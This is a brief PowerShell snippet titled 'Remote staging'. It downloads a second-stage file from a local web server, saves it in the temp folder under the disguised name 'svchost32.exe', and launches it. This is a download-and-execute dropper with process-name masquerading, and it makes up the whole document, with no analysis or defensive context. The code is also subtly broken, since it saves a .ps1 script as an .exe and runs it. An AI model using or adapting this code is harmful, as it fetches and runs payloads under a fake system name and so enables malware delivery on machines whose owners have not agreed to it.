# Remote staging
(New-Object System.Net.WebClient).DownloadFile("http://localhost:8081/stage2.ps1", "$env:TEMP\svchost32.exe")
Start-Process -FilePath "$env:TEMP\svchost32.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
